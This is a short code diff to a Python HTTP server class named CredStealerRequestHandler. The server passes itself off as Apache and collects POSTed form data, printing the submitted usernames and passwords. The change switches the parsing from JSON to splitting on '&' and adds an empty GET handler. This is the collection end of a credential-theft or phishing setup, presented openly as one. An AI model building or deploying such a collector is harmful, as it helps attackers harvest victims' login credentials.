@@ -9,12 +9,16 @@ import argparse
 class CredStealerRequestHandler(http.server.BaseHTTPRequestHandler):
     server_version = "Apache/2.4.9 (Linux)"
     def do_POST(self):
+        print('!!!!!! NEW Post Request Recieved !!!!')
         data_string = self.rfile.read(int(self.headers["Content-Length"]))
         self.send_response(http.HTTPStatus.OK)
         self.end_headers()
-        print(data_string)
-        data = json.loads(urllib.parse.unquote(data_string.decode('utf8')))
-        print("Username: {username}\nPassword: {password}\n\n".format(**data))
+        real_data = data_string.decode("utf-8").split('&')
+        print('username: ' + real_data[0])
+        print('password: ' + real_data[1])
+    def do_GET(self):
+        pass
+        
 
 parser = argparse.ArgumentParser()
 parser.add_argument('port', action='store',
